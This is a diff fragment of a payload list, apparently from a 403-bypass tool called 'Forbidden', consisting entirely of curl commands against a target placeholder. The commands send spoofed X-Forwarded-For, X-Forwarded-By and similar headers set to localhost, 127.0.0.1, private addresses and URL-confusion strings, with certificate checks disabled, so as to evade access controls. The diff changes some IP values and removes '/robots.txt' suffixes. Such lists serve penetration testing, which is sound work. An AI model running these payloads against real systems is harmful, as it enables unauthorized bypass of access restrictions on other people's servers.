 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6783,7 +6783,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Origi
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6797,8 +6797,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Origi
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6820,22 +6820,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Origi
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For-Original: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6846,7 +6846,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6860,8 +6860,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6883,22 +6883,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: 127.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6909,7 +6909,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http:
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6923,8 +6923,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http:
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6946,22 +6946,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: 127.0
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded-By: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6972,7 +6972,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6986,8 +6986,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwarded: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
